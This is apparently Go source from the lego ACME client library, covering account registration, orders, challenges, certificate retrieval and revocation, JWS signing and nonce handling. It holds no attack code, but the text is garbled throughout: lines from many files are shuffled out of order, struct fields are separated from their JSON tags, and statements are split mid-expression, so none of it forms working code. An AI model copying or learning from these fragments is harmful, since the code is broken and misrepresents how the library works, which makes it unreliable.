RevokeCertURL string 
// including unexpired authorizations that the client has completed in the past for identifiers specified in the order.
// ExtendedAccount a extended Account.
// ExtendedOrder a extended Order.
"// orders (required, string):"
// and a server should consider any one of the challenges sufficient to make the authorization valid.
"json:""finalize,omitempty"""
Challenges []Challenge 
"// If a request contains a disallowed reasonCode the server MUST reject it with the error type ""urn:ietf:params:acme:error:badRevocationReason""."
"StatusExpired     = ""expired"""
// CSRMessage Certificate Signing Request
"json:""authorizations,omitempty"""
NewOrderURL   string 
section-7.4
"json:""termsOfServiceAgreed,omitempty"""
"// token (required, string):"
Reason 
"// For final orders (in the ""valid"" or ""invalid"" state), the authorizations that were completed."
// A CSR encoding the parameters for the certificate being requested [RFC2986].
"json:""identifiers"""
"// The order URL, contains the value of the response header "
// then the server MUST NOT create a new account if one does not already exist.
// If this field is not set the server SHOULD omit the reasonCode CRL entry extension when generating OCSP responses and CRLs.
Challenge
Meta          Meta   
"json:""caaIdentities"""
Status string 
// An optional field for binding the new account with an existing non-ACME account (see Section 7.3.4).
Location string 
"// contact (optional, array of string):"
"// validated (optional, string):"
Validated time.Time 
// Package acme contains all objects related the ACME endpoints.
"json:""newAuthz"""
// - https://tools.ietf.org/html/draft-ietf-acme-acme-16
"json:""error,omitempty"""
// associating the new account with an external account.
// The URL to which a response can be posted.
"json:""certificate"""
"// A URL from which a list of orders submitted by this account can be fetched via a POST-as-GET request,"
"json:""onlyReturnExisting,omitempty"""
NotBefore string 
// An array of identifier objects that the order pertains to.
OnlyReturnExisting bool 
"// This field is REQUIRED for objects with ""pending"" or ""valid"" in the status field."
// Identifier the ACME identifier object.
"json:""keyChange"""
Certificate string 
"""encoding/json"""
type RevokeCertMessage struct {
"// authorizations (required, array of string):"
"""time"""
"// A client should attempt to fulfill one of these challenges,"
type Identifier struct {
"// termsOfService (optional, string):"
// This allows clients to determine the correct issuer domain name to use when configuring CAA records.
// encoded in the format specified in RFC 3339 [RFC3339].
"json:""validated,omitempty"""
"// identifiers (required, array of object):"
type CSRMessage struct {
"// The certificate to be revoked, in the base64url-encoded version of the DER format."
Finalize string 
"// termsOfServiceAgreed (optional, boolean):"
"json:""externalAccountRequired"""
"json:""contact,omitempty"""
"// Possible values are: ""pending"", ""valid"", ""invalid"", ""deactivated"", ""expired"", and ""revoked""."
"// (Note: Because this field uses base64url, and does not include headers, it is different from PEM.)."
// Account the ACME account Object.
KeyChangeURL  string 
"json:""externalAccountBinding,omitempty"""
"// For valid authorizations, the challenge that was validated."
Account
"// The requested value of the notBefore field in the certificate,"
"// challenges (required, array of objects):"
AuthorizationURL string 
"// with a value that contained a wildcard prefix this field MUST be present, and true."
Wildcard bool 
"// csr (required, string):"
"json:""type"""
// The type of challenge encoded in the object.
Website string 
"// A challenge object with an error MUST have status equal to ""invalid""."
// https://tools.ietf.org/html/draft-ietf-acme-acme-16
section-7.1.3
// for the purposes of CAA record validation as defined in [RFC6844].
type Meta struct {
// A random value that uniquely identifies the challenge.
"// whereas ""revoked"" should be used to indicate server- initiated deactivation. (See Section 7.1.6)"
"json:""token"""
Csr string 
"// certificate (required, string):"
// This field is structured as a problem document [RFC7807].
// The server MAY disallow a subset of reasonCodes from being used by the user.
"StatusRevoked     = ""revoked"""
"// The status of this challenge. Possible values are: ""pending"", ""processing"", ""valid"", and ""invalid""."
NewAuthzURL   string 
"json:""url"""
section-9.7.7
Expires string 
"json:""identifier,omitempty"""
"// If this field is present with the value ""true"","
ExternalAccountBinding json.RawMessage 
"// For pending authorizations, the challenges that the client can fulfill in order to prove possession of the identifier."
// The status of this account.
// An array of URLs that the server can use to contact the client for issues related to this account.
"// expires (optional, string):"
"// that the server will expect to see as the ""Issuer Domain Name"" in a CAA issue or issuewild property tag."
Link
section-7.1.1
type ExtendedAccount struct {
type Challenge struct {
section-8.1
"StatusDeactivated = ""deactivated"""
"json:""status"""
"// wildcard (optional, boolean):"
type ExtendedOrder struct {
type ExtendedChallenge struct {
// Contains the value of the response header 
NewAccountURL string 
// The status of this authorization.
"json:""meta"""
type Account struct {
Token string 
"json:""reason,omitempty"""
"json:""newOrder"""
const (
section-3.1
"""fmt"""
type NonceError struct {
// NonceError represents the error which is returned
Identifier Identifier 
import (
type SubProblem struct {
func (p ProblemDetails) Error() string {
"msg := fmt.Sprintf(""acme: error: %d"", p.HTTPStatus)"
URL    string 
"= fmt.Sprintf("" :: %s :: %s"", p.Method, p.URL)"
return msg
"json:""instance,omitempty"""
Detail      string       
Type       string     
Detail     string     
"json:""url,omitempty"""
"json:""detail,omitempty"""
// - https://tools.ietf.org/html/rfc7807
"json:""subproblems,omitempty"""
 len(p.URL) != 0 {
"json:""status,omitempty"""
if len(p.Instance) == 0 {
Type        string       
section-7.3.3
"for _, sub := range p.SubProblems {"
"errNS       = ""urn:ietf:params:acme:error:"""
SubProblems []SubProblem 
// Errors types
"json:""identifier,omitempty"""
// ProblemDetails the problem details object
Method string 
type ProblemDetails struct {
"// SubProblem a ""subproblems"""
"= "", url: "" "
"json:""method,omitempty"""
Instance    string       
// - https://tools.ietf.org/html/draft-ietf-acme-acme-16
" ""badNonce"""
HTTPStatus  int          
ProblemDetails
if len(p.Method) != 0 
package acme
"= fmt.Sprintf("", problem: %q :: %s"", sub.Type, sub.Detail)"
// additional values to have a better error message (Not defined by the RFC)
 p.Instance
"json:""type,omitempty"""
msg 
// if the nonce sent by the client was not accepted by the server.
section-6.7.1
"= fmt.Sprintf("" :: %s :: %s"", p.Type, p.Detail)"
BadNonceErr = errNS 
const (
import (
"chlng.AuthorizationURL = getLink(resp.Header, ""up"")"
var chlng acme.ExtendedChallenge
package api
chlng)
// Get Gets a challenge.
// Challenge initiation is done by sending a JWS payload containing the trivial JSON object 
// New Creates a challenge.
"ChallengeService) Get(chlgURL string) (acme.ExtendedChallenge, error) {"
"return chlng, nil"
"return acme.ExtendedChallenge{}, err"
"""github.com/go-acme/lego/v3/acme"""
func (c 
"ChallengeService) New(chlgURL string) (acme.ExtendedChallenge, error) {"
"return acme.ExtendedChallenge{}, errors.New(""challenge[new]: empty URL"")"
chlng.RetryAfter = getRetryAfter(resp)
"resp, err := c.core.postAsGet(chlgURL, "
if len(chlgURL) == 0 {
// We use an empty struct instance as the postJSON payload here to achieve this result.
"resp, err := c.core.post(chlgURL, struct{}{}, "
"""errors"""
"return acme.ExtendedChallenge{}, errors.New(""challenge[get]: empty URL"")"
type ChallengeService service
if err != nil {
"""fmt"""
"resp, err := a.core.post(a.core.GetDirectory().NewAccountURL, req, "
var account acme.Account
if len(location) > 0 {
"""encoding/base64"""
a.core.jws.SetKid(location)
import (
"return acme.ExtendedAccount{Location: location}, err"
"return acme.ExtendedAccount{}, fmt.Errorf(""acme: could not decode hmac key: %v"", err)"
"AccountService) Get(accountURL string) (acme.Account, error) {"
"AccountService) New(req acme.Account) (acme.ExtendedAccount, error) {"
package api
// Deactivate Deactivates an account.
return a.New(accMsg)
AccountService) Deactivate(accountURL string) error {
"_, err := a.core.post(accountURL, acme.Account{}, "
"eabJWS, err := a.core.signEABContent(a.core.GetDirectory().NewAccountURL, kid, hmac)"
type AccountService service
"return acme.Account{}, errors.New(""account[get]: empty URL"")"
"return errors.New(""account[deactivate]: empty URL"")"
account)
"return acme.Account{}, err"
"""github.com/go-acme/lego/v3/acme"""
location := getLocation(resp)
return err
"return acme.ExtendedAccount{Account: account, Location: location}, nil"
func (a 
"AccountService) NewEAB(accMsg acme.Account, kid string, hmacEncoded string) (acme.ExtendedAccount, error) {"
req := acme.Account{Status: acme.StatusDeactivated}
accMsg.ExternalAccountBinding = eabJWS
// NewEAB Creates a new account with an External Account Binding.
"""errors"""
"return account, nil"
if err != nil {
"_, err := a.core.post(accountURL, req, nil)"
"hmac, err := base64.RawURLEncoding.DecodeString(hmacEncoded)"
"return acme.ExtendedAccount{}, fmt.Errorf(""acme: error signing eab content: %v"", err)"
// New Creates a new account.
if len(accountURL) == 0 {
// Get Retrieves an account.
"AuthorizationService) Get(authzURL string) (acme.Authorization, error) {"
disabledAuth)
import (
"return authz, nil"
package api
"return errors.New(""authorization[deactivate]: empty URL"")"
var authz acme.Authorization
"_, err := c.core.post(authzURL, acme.Authorization{Status: acme.StatusDeactivated}, "
"""github.com/go-acme/lego/v3/acme"""
func (c 
authz)
var disabledAuth acme.Authorization
return err
// Deactivate Deactivates an authorization.
"_, err := c.core.postAsGet(authzURL, "
"return acme.Authorization{}, err"
"return acme.Authorization{}, errors.New(""authorization[get]: empty URL"")"
if len(authzURL) == 0 {
// Get Gets an authorization.
"""errors"""
if err != nil {
type AuthorizationService service
AuthorizationService) Deactivate(authzURL string) error {
"log.Infof(""acme: Requesting issuer cert from %s"", up)"
"log.Warnf(""acme: Could not bundle issuer certificate [%s]: %v"", certURL, err)"
"return nil, err"
"cert = append(cert, issuer...)"
"// get Returns the certificate and the ""up"" link."
section-7.4.2
import (
"issuer, err = c.getIssuerFromLink(up)"
"cert, up, err := c.get(certURL)"
"return nil, """", errors.New(""certificate[get]: empty URL"")"
"""encoding/pem"""
package api
"// If bundle is true, we want to return a certificate bundle."
"CertificateService) get(certURL string) ([]byte, string, error) {"
// getIssuerFromLink requests the issuer certificate
"""io/ioutil"""
"resp, err := c.core.postAsGet(certURL, nil)"
"up := getLink(resp.Header, ""up"")"
"CertificateService) getIssuerFromLink(up string) ([]byte, error) {"
if bundle {
// See https://community.letsencrypt.org/t/acme-v2-no-up-link-in-response/64962
"_, issuer := pem.Decode(cert)"
"return cert, issuer, nil"
"return certcrypto.PEMEncode(certcrypto.DERCertificateBytes(cert)), nil"
"_, err := c.core.post(c.core.GetDirectory().RevokeCertURL, req, nil)"
CertificateService) Revoke(req acme.RevokeCertMessage) error {
// 'bundle' is only applied if the issuer is provided by the 'up' link.
"return nil, nil"
"// To do this, we append the issuer cert to the issued cert."
} else if len(issuer) > 0 {
// Get Returns the certificate and the issuer certificate.
"""github.com/go-acme/lego/v3/acme"""
"""crypto/x509"""
"cert, err := ioutil.ReadAll(http.MaxBytesReader(nil, resp.Body, maxBodySize))"
func (c 
"CertificateService) Get(certURL string, bundle bool) ([]byte, []byte, error) {"
"return nil, """", err"
// See https://tools.ietf.org/html/draft-ietf-acme-acme-12
if issuer != nil {
"cert, _, err := c.get(up)"
"""github.com/go-acme/lego/v3/log"""
"_, err = x509.ParseCertificate(cert)"
"return cert, up, err"
return err
// Revoke Revokes a certificate.
type CertificateService service
"return nil, nil, err"
if len(certURL) == 0 {
const maxBodySize = 1024 
if len(up) == 0 {
"""github.com/go-acme/lego/v3/certcrypto"""
// in the response headers of a new certificate.
"""errors"""
"// If we fail to acquire the issuer cert, return the issued certificate - do not fail."
if err != nil {
// maxBodySize is the maximum size of body that we will read.
"// The issuer certificate link may be supplied via an ""up"" link"
"""net/http"""
 1024
// Get issuerCert from bundled response from Let's Encrypt
var linkExpr = regexp.MustCompile(
import (
package api
"for _, m := range linkExpr.FindAllStringSubmatch(link, -1) {"
"return resp.Header.Get(""Retry-After"")"
"return """""
type service struct {
"for _, link := range header[""Link""] {"
"return resp.Header.Get(""Location"")"
"""regexp"""
"func getLink(header http.Header, rel string) string {"
func getLocation(resp 
if m[2] == rel {
return m[1]
core 
http.Response) string {
continue
func getRetryAfter(resp 
Core
if len(m) != 3 {
if resp == nil {
"rel=""(."
// getLink get a rel into the Link header
// getRetryAfter get the value of the header Retry-After
// getLocation get the value of the header Location
"""net/http"""
nonceManager 
"if _, err := do.Get(caDirURL, "
package api
nonces.Manager
"if dir.NewOrderURL == """" {"
dir)
var err error
var dir acme.Directory
"return dir, fmt.Errorf(""get directory at '%s': %v"", caDirURL, err)"
// Retry if the nonce was invalidated
http.Client
default:
return a.jws.GetKeyAuthorization(token)
http.Response
AuthorizationService)(
c.common)
ChallengeService)(
c := 
return nil
// New Creates a new Core.
"""bytes"""
directory    acme.Directory
"nonceManager := nonces.NewManager(doer, dir.NewNonceURL)"
"""github.com/go-acme/lego/v3/log"""
operation := func() error {
"doer := sender.NewDoer(httpClient, userAgent)"
bo := backoff.NewExponentialBackOff()
"""github.com/go-acme/lego/v3/acme/api/internal/secure"""
"""context"""
"nonce, nonceErr := nonces.GetFromResponse(resp)"
c.Certificates = (
"Core) retrievablePost(uri string, content []byte, response interface{}) ("
"""errors"""
"return c, nil"
"sender.Doer, caDirURL string) (acme.Directory, error) {"
a.nonceManager.Push(nonce)
 time.Second
"if dir.NewAccountURL == """" {"
ChallengeService
CertificateService)(
90% of bad nonce with a minimum of attempts.
secure.JWS
bo.InitialInterval = 200 
OrderService)(
 err != nil {
"return dir, errors.New(""directory missing new registration URL"")"
doer         
return err
"log.Infof(""nonce error retry: %s"", err)"
if nonceErr == nil {
bo.MaxElapsedTime = 20 
"Core) GetKeyAuthorization(token string) (string, error) {"
"return nil, errors.New(""failed to marshal message"")"
"""github.com/go-acme/lego/v3/acme/api/internal/sender"""
func New(httpClient 
if err != nil {
"err := backoff.Retry(operation, backoff.WithContext(bo, ctx))"
case 
"http.Client, userAgent string, caDirURL, kid string, privateKey crypto.PrivateKey) ("
"""net/http"""
Orders         
"json"", response)"
"Core) postAsGet(uri string, response interface{}) ("
"""fmt"""
// GetKeyAuthorization Gets the key authorization
import (
"// during tests, allow to support "
Accounts       
"jws := secure.NewJWS(privateKey, kid, nonceManager)"
cancel()
"signedContent, err := a.jws.SignContent(uri, content)"
c.Orders = (
"http.Response, error) {"
Core) GetDirectory() acme.Directory {
"Core) post(uri string, reqBody, response interface{}) ("
Certificates   
"return nil, fmt.Errorf(""failed to post JWS message -> failed to sign content -> %v"", err)"
"ctx, cancel := context.WithCancel(context.Background())"
return a.directory
func (a 
func getDirectory(do 
AuthorizationService
"""github.com/go-acme/lego/v3/acme/api/internal/nonces"""
"// post performs an HTTP POST request and parses the response body as JSON,"
"resp, err = a.signedPost(uri, content, response)"
"return dir, errors.New(""directory missing new order URL"")"
"dir, err := getDirectory(doer, caDirURL)"
c.common.core = c
"""encoding/json"""
var resp 
sender.Doer
"eabJWS, err := a.jws.SignEABContent(newAccountURL, kid, hmac)"
"""time"""
"Core) signedPost(uri string, content []byte, response interface{}) ("
type Core struct {
"""github.com/cenkalti/backoff/v3"""
// Core ACME/LE core API.
section-6.3
jws          
"return nil, err"
switch err.(type) {
// nonceErr is ignored to keep the root error.
"return dir, nil"
"// postAsGet performs an HTTP POST (""POST-as-GET"") request."
"content, err := json.Marshal(reqBody)"
bo.MaxInterval = 5 
signedBody := bytes.NewBuffer([]byte(signedContent.FullSerialize()))
"return []byte(eabJWS.FullSerialize()), nil"
"Core{doer: doer, nonceManager: nonceManager, jws: jws, directory: dir, HTTPClient: httpClient}"
// https://tools.ietf.org/html/draft-ietf-acme-acme-16
"return a.retrievablePost(uri, []byte{}, response)"
common         service // Reuse a single struct instead of allocating one for each service on the heap.
"Core) signEABContent(newAccountURL, kid string, hmac []byte) ([]byte, error) {"
"""crypto"""
Challenges     
acme.NonceError:
"Core, error) {"
"""github.com/go-acme/lego/v3/acme"""
c.Challenges = (
// into the provided respBody object.
CertificateService
 time.Millisecond
AccountService
HTTPClient   
AccountService)(
"return resp, err"
OrderService
"return a.retrievablePost(uri, content, response)"
c.Authorizations = (
c.Accounts = (
"resp, err := a.doer.Post(uri, signedBody, ""application/jose"
"return resp, nil"
Authorizations 
type OrderService service
"Order:    order,"
if len(orderURL) == 0 {
"""encoding/base64"""
import (
// UpdateForCSR Updates an order for a CSR.
package api
"return acme.Order{}, errors.New(""order[get]: empty URL"")"
"identifiers = append(identifiers, acme.Identifier{Type: ""dns"", Value: domain})"
"_, err := o.core.postAsGet(orderURL, "
"OrderService) Get(orderURL string) (acme.Order, error) {"
"return acme.ExtendedOrder{}, err"
"for _, domain := range domains {"
return acme.ExtendedOrder{
order)
"""github.com/go-acme/lego/v3/acme"""
if order.Status == acme.StatusInvalid {
"_, err := o.core.post(orderURL, csrMsg, "
"OrderService) New(domains []string) (acme.ExtendedOrder, error) {"
orderReq := acme.Order{Identifiers: identifiers}
"Csr: base64.RawURLEncoding.EncodeToString(csr),"
// Get Gets an order.
"}, nil"
"return order, nil"
// New Creates a new order.
"return acme.Order{}, order.Error"
"resp, err := o.core.post(o.core.GetDirectory().NewOrderURL, orderReq, "
func (o 
"Location: resp.Header.Get(""Location""),"
"return acme.Order{}, err"
"""errors"""
if err != nil {
var identifiers []acme.Identifier
var order acme.Order
csrMsg := acme.CSRMessage{
"OrderService) UpdateForCSR(orderURL string, csr []byte) (acme.Order, error) {"
JWS) SetKid(kid string) {
"JWS) SignEABContent(url, kid string, hmac []byte) ("
nonces.Manager
var alg jose.SignatureAlgorithm
"return nil, fmt.Errorf(""acme: error encoding eab jwk key: %v"", err)"
if k.Curve == elliptic.P256() {
} else if k.Curve == elliptic.P384() {
// NewJWS Create a new JWS.
alg = jose.ES256
" keyThumb, nil"
" ""."" "
kid     string // Key identifier
switch k := j.privKey.(type) {
nonces.Manager) 
"return """", err"
privKey crypto.PrivateKey
jose.JSONWebKey{Key: publicKey}
"EmbedJWK: false,"
func (j 
"thumbBytes, err := jwk.Thumbprint(crypto.SHA256)"
"Algorithm: alg,"
"""encoding/base64"""
signKey := jose.SigningKey{
"signed, err := signer.Sign(content)"
"""crypto/elliptic"""
"Key:       jose.JSONWebKey{Key: j.privKey, KeyID: j.kid},"
"signer, err := jose.NewSigner(signKey, "
"jose.SigningKey{Algorithm: jose.HS256, Key: hmac},"
"return nil, fmt.Errorf(""failed to create jose signer -> %v"", err)"
keyThumb := base64.RawURLEncoding.EncodeToString(thumbBytes)
publicKey = k.Public()
// SignContent Signs a content with the JWS.
// SignEABContent Signs an external account binding content with the JWS.
JWS {
"if j.kid == """" {"
if err != nil {
case 
rsa.PrivateKey:
var publicKey crypto.PublicKey
alg = jose.RS256
"""fmt"""
import (
"""crypto/ecdsa"""
"JWS) SignContent(url string, content []byte) ("
"return signed, nil"
"""url"": url,"
"return nil, fmt.Errorf(""failed to sign content -> %v"", err)"
"jose.JSONWebSignature, error) {"
nonces  
jose.SignerOptions{
// unpad the base64URL
type JWS struct {
return token 
"""github.com/go-acme/lego/v3/acme/api/internal/nonces"""
"privKey: privateKey,"
"""kid"": kid,"
// SetKid Sets a key identifier.
// GetKeyAuthorization Gets the key authorization for a token.
ExtraHeaders: map[jose.HeaderKey]interface{}{
options)
return 
"""crypto/rsa"""
"func NewJWS(privateKey crypto.PrivateKey, kid string, nonceManager "
"return nil, fmt.Errorf(""failed to External Account Binding sign content -> %v"", err)"
"signed, err := signer.Sign(jwkJSON)"
JWS{
"kid:     kid,"
ecdsa.PrivateKey:
options := jose.SignerOptions{
"signer, err := jose.NewSigner("
// Generate the Key Authorization for the challenge
"""crypto"""
options.EmbedJWK = true
alg = jose.ES384
"NonceSource: j.nonces,"
"jose ""gopkg.in/square/go-jose.v2"""
jwk := 
// JWS Represents a JWS.
j.kid = kid
"jwkJSON, err := jwk.Public().MarshalJSON()"
"return nil, fmt.Errorf(""failed to create External Account Binding jose signer -> %v"", err)"
"JWS) GetKeyAuthorization(token string) (string, error) {"
jwk := jose.JSONWebKey{Key: j.privKey}
package secure
"nonces:  nonceManager,"
// Manager Manages nonces.
"""fmt"""
Manager{
"Manager) getNonce() (string, error) {"
"return nonce, true"
"return """", errors.New(""nil response"")"
import (
"Manager) Nonce() (string, error) {"
"nonce := resp.Header.Get(""Replay-Nonce"")"
func NewManager(do 
func GetFromResponse(resp 
"http.Response) (string, error) {"
"return """", fmt.Errorf(""server did not respond with a proper nonce header"")"
nonce := n.nonces[len(n.nonces)-1]
if len(n.nonces) == 0 {
// Nonce implement jose.NonceSource
func (n 
 ok {
"n.nonces = append(n.nonces, nonce)"
"nonceURL: nonceURL,"
"resp, err := n.do.Head(n.nonceURL)"
nonces   []string
// GetFromResponse Extracts a nonce from a HTTP response.
// Pop Pops a nonce.
"return """", fmt.Errorf(""failed to get nonce from HTTP HEAD -> %v"", err)"
"return """", false"
Manager) Push(nonce string) {
n.nonces = n.nonces[:len(n.nonces)-1]
return GetFromResponse(resp)
type Manager struct {
"if nonce == """" {"
"do:       do,"
nonceURL string
"Manager) Pop() (string, bool) {"
"return nonce, nil"
"""sync"""
sync.Mutex
if resp == nil {
// NewManager Creates a new Manager.
Manager {
"""github.com/go-acme/lego/v3/acme/api/internal/sender"""
package nonces
"""errors"""
"sender.Doer, nonceURL string) "
sender.Doer
"if nonce, ok := n.Pop()"
if err != nil {
n.Lock()
return n.getNonce()
"""net/http"""
return 
defer n.Unlock()
// Push Pushes a nonce.
do       
Doer) formatUserAgent() string {
"req, err := d.newRequest(http.MethodHead, url, nil)"
"err = json.Unmarshal(body, "
httpClient 
"return fmt.Errorf(""%d ::%s :: %s :: %v :: %s"", resp.StatusCode, req.Method, req.URL, err, string(body))"
"return req, nil"
"""io/ioutil"""
"return nil, fmt.Errorf(""failed to create request: %v"", err)"
func NewDoer(client 
http.Client
"Doer) newRequest(method, uri string, body io.Reader, opts ...RequestOption) ("
Doer) Head(url string) (
Doer{
" %s)"", d.userAgent, ourUserAgent, ourUserAgentComment, runtime.GOOS, runtime.GOARCH)"
return nil
http.Response) error {
if errorDetails.HTTPStatus == http.StatusBadRequest 
// Post performs a POST request with a proper User-Agent string.
"body, err := ioutil.ReadAll(resp.Body)"
"req, err := http.NewRequest(method, uri, body)"
"""strings"""
"ua := fmt.Sprintf(""%s %s (%s"
err = opt(req)
package sender
Doer) do(req 
"raw, err := ioutil.ReadAll(resp.Body)"
"httpClient: client,"
"userAgent:  userAgent,"
 err != nil {
"req.Header.Set(""Content-Type"", ct)"
var errorDetails 
if err != nil {
"for _, opt := range opts {"
acme.ProblemDetails
"return d.do(req, response)"
"req.Header.Set(""User-Agent"", d.formatUserAgent())"
"""net/http"""
// Check for errors we handle specifically
http.Request) error {
"""fmt"""
// NewDoer Creates a new Doer.
"req, err := d.newRequest(http.MethodPost, url, body, contentType(bodyType))"
"if err = checkError(req, resp)"
import (
func checkError(req 
// The response body (resp.Body) is already closed when this function returns.
userAgent  string
"return d.do(req, nil)"
"err = json.Unmarshal(raw, response)"
"http.Request, error) {"
"http.Response, error) {"
defer resp.Body.Close()
"http.Request, resp "
// formatUserAgent builds and returns the User-Agent string to use in requests.
"http.Client, userAgent string) "
// Get performs a GET request with a proper User-Agent string.
func (d 
"req, err := d.newRequest(http.MethodGet, url, nil)"
"""encoding/json"""
errorDetails.Method = req.Method
"http.Request, response interface{}) ("
return 
return func(req 
// Head performs a HEAD request with a proper User-Agent string.
"Doer) Get(url string, response interface{}) ("
"return nil, err"
"resp, err := d.httpClient.Do(req)"
"return fmt.Errorf(""%d :: %s :: %s :: %v"", resp.StatusCode, req.Method, req.URL, err)"
"// If ""response"" is not provided, callers should close resp.Body when done reading from it."
func contentType(ct string) RequestOption {
"""runtime"""
return errorDetails
if resp.StatusCode >= http.StatusBadRequest {
"""github.com/go-acme/lego/v3/acme"""
return strings.TrimSpace(ua)
 errorDetails.Type == acme.BadNonceErr {
"""io"""
type Doer struct {
if response != nil {
errorDetails)
"return resp, err"
Doer {
acme.NonceError{ProblemDetails: errorDetails}
"Doer) Post(url string, body io.Reader, bodyType string, response interface{}) ("
http.Request) error
type RequestOption func(
errorDetails.URL = req.URL.String()
"return resp, nil"
"return resp, fmt.Errorf(""failed to unmarshal %q to type %T: %v"", raw, response, err)"
"ourUserAgent = ""xenolf-acme/3.1.0"""
// ourUserAgent is the User-Agent of this underlying library package.
// values: detach
release
"ourUserAgentComment = ""release"""
// NOTE: Update this with each tagged release.
// CODE GENERATED AUTOMATICALLY
package sender
// THIS FILE MUST NOT BE EDITED BY HAND
const (
// ourUserAgentComment is part of the UA comment linked to the version status of this underlying library package.
"log.Infof(""acme: Deleting account for %s"", r.user.GetEmail())"
"Resource{URI: accountTransit.Location, Body: account}, nil"
// Location: header is not returned so this needs to be populated off of existing URI
func NewRegistrar(core 
"return errors.New(""acme: cannot unregister a nil client or user"")"
"TermsOfServiceAgreed: options.TermsOfServiceAgreed,"
 r.user == nil {
"Resource, error) {"
"json:""body,omitempty"""
"errorDetails, ok := err.(acme.ProblemDetails)"
core 
if !ok 
Body acme.Account 
"return nil, errors.New(""acme: cannot query the registration of a nil client or user"")"
"""github.com/go-acme/lego/v3/log"""
 r.user.GetEmail()}
Kid                  string
// of which the client needs to keep track itself.
Registrar{
// FIXME seems impossible
Resource{
"URI: r.user.GetRegistration().URI,"
type Resource struct {
"""errors"""
// but acting on an existing registration link and resource.
Registrar) RegisterWithExternalAccountBinding(options RegisterEABOptions) (
// Log the URL here instead of the email as the email may not be set
 errorDetails.HTTPStatus != http.StatusConflict {
// Register the current account to the ACME server.
"account, err := r.core.Accounts.Get(accountTransit.Location)"
"// This is similar to the Register function,"
URI  string       
Registrar) ResolveAccountByKey() (
"accMsg.Contact = []string{""mailto:"" "
type RegisterEABOptions struct {
"""github.com/go-acme/lego/v3/acme/api"""
if err != nil {
accMsg := acme.Account{
"""net/http"""
if r == nil 
// RegisterWithExternalAccountBinding Register the current account to the ACME server.
import (
"account, err := r.core.Accounts.NewEAB(accMsg, options.Kid, options.HmacEncoded)"
Registrar) DeleteRegistration() error {
// DeleteRegistration deletes the client's user registration from the ACME server.
"log.Infof(""acme: Trying to resolve account by key"")"
api.Core
Registrar) Register(options RegisterOptions) (
"core: core,"
"if r.user.GetEmail() != """" {"
"account, err := r.core.Accounts.New(accMsg)"
user User
accMsg := acme.Account{OnlyReturnExisting: true}
Registrar) QueryRegistration() (
"}, nil"
// QueryRegistration runs a POST request on the client's registration and returns the result.
package registration
return 
"return nil, err"
"// WARNING: will be remove in the future (acme.ExtendedAccount), https://github.com/go-acme/lego/issues/855."
// and return its registration resource.
"return nil, errors.New(""acme: cannot register a nil client or user"")"
TermsOfServiceAgreed bool
"account, err := r.core.Accounts.Get(r.user.GetRegistration().URI)"
type RegisterOptions struct {
"accountTransit, err := r.core.Accounts.New(accMsg)"
"log.Infof(""acme: Querying account for %s"", r.user.GetRegistration().URI)"
type Registrar struct {
// ResolveAccountByKey will attempt to look up an account using the given account key
"""github.com/go-acme/lego/v3/acme"""
"json:""uri,omitempty"""
"Contact:              []string{},"
"api.Core, user User) "
"user: user,"
func (r 
// Resource represents all important information about a registration
HmacEncoded          string
"Resource{URI: account.Location, Body: account.Account}, nil"
"Body: account,"
Registrar {
return r.core.Accounts.Deactivate(r.user.GetRegistration().URI)
"log.Infof(""acme: Registering account for %s"", r.user.GetEmail())"
GetEmail() string
type User interface {
GetPrivateKey() crypto.PrivateKey
// User interface is to be implemented by users of this library.
import (
GetRegistration() 
package registration
// It is used by the client type to get user specific information.
"""crypto"""
Resource
"if pemBlock.Type != ""CERTIFICATE REQUEST"" {"
if existingName == sanName {
return pem.EncodeToMemory(PEMBlock(data))
"pem.Block{Type: ""CERTIFICATE"", Bytes: []byte(data.(DERCertificateBytes))}"
"pem.Block{Type: ""CERTIFICATE REQUEST"", Bytes: key.Raw}"
"RSA4096 = KeyType(""4096"")"
"DNSNames:              []string{domain},"
"serialNumber, err := rand.Int(rand.Reader, serialNumberLimit)"
"cert, err := x509.ParseCertificate(certDERBlock.Bytes)"
case EC256:
default:
"CommonName: ""ACME Challenge TEMP"","
"pemBlock, err := pemDecode(cert)"
"pemBlock, err := pemDecode(pem)"
if expiration.IsZero() {
type KeyType string
"privateKey.PublicKey, privateKey)"
// OCSPServerFailed means that the OCSP responder failed to process the request.
switch keyType {
"KeyUsage:              x509.KeyUsageKeyEncipherment,"
"""crypto/x509"""
"""encoding/asn1"""
"pem.Block{Type: ""CERTIFICATE"", Bytes: derBytes}), nil"
"NotAfter:  expiration,"
expiration = time.Now().Add(365)
"Value: ocspMustStapleFeature,"
OCSPUnknown = ocsp.Unknown
func ExtractDomainsCSR(csr 
"template, "
return x509.ParseECPrivateKey(keyBlock.Bytes)
"return nil, fmt.Errorf(""PEM decode did not yield a valid block. Is the certificate in the right format"
pemBlock = 
"""errors"""
"serialNumberLimit := new(big.Int).Lsh(big.NewInt(1), 128)"
"Id:    tlsFeatureExtensionOID,"
"pemBlock, _ := pem.Decode(data)"
// from a DER encoded certificate
"return ecdsa.GenerateKey(elliptic.P256(), rand.Reader)"
"""golang.org/x/crypto/ocsp"""
"tlsFeatureExtensionOID = asn1.ObjectIdentifier{1, 3, 6, 1, 5, 5, 7, 1, 24}"
// Constants for OCSP must staple
"RSA2048 = KeyType(""2048"")"
var pemBlock 
domains := []string{cert.Subject.CommonName}
"return nil, fmt.Errorf(""invalid KeyType: %s"", keyType)"
"template.ExtraExtensions = append(template.ExtraExtensions, pkix.Extension{"
"pem.Block{Type: ""RSA PRIVATE KEY"", Bytes: x509.MarshalPKCS1PrivateKey(key)}"
return pem.EncodeToMemory(
// ParsePEMCertificate returns Certificate from a PEM encoded certificate.
"for _, sanDomain := range cert.DNSNames {"
"certDERBlock, bundle = pem.Decode(bundle)"
func PEMEncode(data interface{}) []byte {
"certificates = append(certificates, cert)"
"""crypto/elliptic"""
var certDERBlock 
return pemBlock
"func GeneratePrivateKey(keyType KeyType) (crypto.PrivateKey, error) {"
"return nil, errors.New(""unknown PEM header value"")"
"pem.Block{Type: ""EC PRIVATE KEY"", Bytes: keyBytes}"
// OCSPGood means that the certificate is valid.
// The certificate has to be PEM encoded. Any other encodings like DER will fail.
continue
if certDERBlock == nil {
"func containsSAN(domains []string, sanName string) bool {"
"func ParsePEMPrivateKey(key []byte) (crypto.PrivateKey, error) {"
for {
"return certificates, nil"
func PemDecodeTox509CSR(pem []byte) (
case RSA2048:
// OCSPUnknown means that the OCSP responder doesn't know about the certificate.
 skip this name
func pemDecode(data []byte) (
break
if sanDomain == cert.Subject.CommonName {
if err != nil {
return true
case 
rsa.PrivateKey:
return domains
